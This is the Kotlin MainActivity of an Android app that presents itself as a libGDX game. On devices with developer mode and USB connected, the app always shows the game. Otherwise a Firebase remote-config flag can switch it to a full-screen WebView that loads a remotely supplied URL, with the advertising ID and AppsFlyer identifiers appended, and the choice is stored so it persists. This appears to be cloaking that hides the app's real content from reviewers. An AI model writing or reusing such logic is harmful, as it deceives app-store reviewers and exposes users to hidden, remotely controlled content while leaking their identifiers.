package com.egypt.tian.sto.game

import android.content.pm.ActivityInfo
import android.os.Bundle
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.FirebaseApp
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.egypt.tian.sto.game.databinding.ActivityMainBinding
import com.egypt.tian.sto.game.util.AppsflyerUtil
import com.egypt.tian.sto.game.util.Completer
import com.egypt.tian.sto.game.util.DataStoreManager
import com.egypt.tian.sto.game.util.Lottie
import com.egypt.tian.sto.game.util.Once
import com.egypt.tian.sto.game.util.internetConnection
import com.egypt.tian.sto.game.util.isDevMode
import com.egypt.tian.sto.game.util.isUSB
import com.egypt.tian.sto.game.util.log
import com.egypt.tian.sto.game.webView.WebViewFragment
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val NumeriCa = 507
        var salabonna    = ""

        val kudaIdtiFragment = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding      : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    val webViewFragment = WebViewFragment(this)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            proverkaNaPodlennost()
//            startFragment.tryEmit(R.id.libGDXFragment)
//            startFragmentID.tryEmit(INTERPOL)

            coroutine.launch(Dispatchers.Main) {
                kudaIdtiFragment.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            webViewFragment.goneWebView()
                            setNavigationBarColor(R.color.black)
                            setStartDestination(fragmentId)
                            ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                        }
                        NumeriCa            -> {
                            webViewFragment.showAndOpenUrl()
                            setNavigationBarColor(R.color.white)
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else                -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation = it }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
        webViewFragment.onCreate(coroutine, binding.provodnik)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(2_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun proverkaNaPodlennost() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Gol" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        salabonna = it
                        kudaIdtiFragment.emit(NumeriCa)
                    }
                }
                "Pro" -> {
                    log("DataStoreManager Key = GAME")
                    kudaIdtiFragment.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    if (isDevMode(this@MainActivity) && isUSB(this@MainActivity)) openPro()
                    else takeSea()
                }
            }
        }
    }

    private fun takeSea() {
        FirebaseApp.initializeApp(appContext)

        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                try {
                    if (task.isSuccessful) {
                        coroutine.launch {
                            val jsonData = JSONObject(getString("chose"))
                            log("success = $jsonData")

                            checkWhatIsIt(
                                chose = jsonData.getBoolean("chose"),
                                bare  = jsonData.getString("bare")
                            )
                        }
                    } else {
                        kudaIdtiFragment.tryEmit(R.id.libGDXFragment)
                        log("getFirebaseData Fail = ${this.all}")
                    }
                } catch (e: Exception) {
                    kudaIdtiFragment.tryEmit(R.id.libGDXFragment)
                    log("EXCEPTION try catch = ${e.message}")
                }
            }
        }
    }

    private suspend fun checkWhatIsIt(chose: Boolean, bare: String) {
        if (chose) {
            withContext(Dispatchers.Main) {
                val completer = Completer(coroutine, 1) {
                    val advertisingId = AdvertisingIdClient.getAdvertisingIdInfo(appContext).id
                    val appsflyerUID  = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                    val result = bare + "?" +
                            "adresko=${advertisingId}&" +
                            "appolo=${appsflyerUID}&" +
                            "camapa=${AppsflyerUtil.campaignFlow.value}"

                    log("result = $result")

                    openGol(result)
                }

                AppsflyerUtil.initialize(this@MainActivity)
                coroutine.launch {
                    AppsflyerUtil.campaignFlow.collect {
                        log("campaignFlow = $it")
                        if (it != AppsflyerUtil.CAMPAIGN_INIT_VALUE) completer.complete()
                    }
                }
            }
        } else openPro()
    }

    private fun openPro() {
        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "Pro" }
            kudaIdtiFragment.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun openGol(color: String) {
        salabonna = color
        kudaIdtiFragment.tryEmit(NumeriCa)

        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "Gol" }
            DataStoreManager.Link.update { salabonna }
        }
    }

}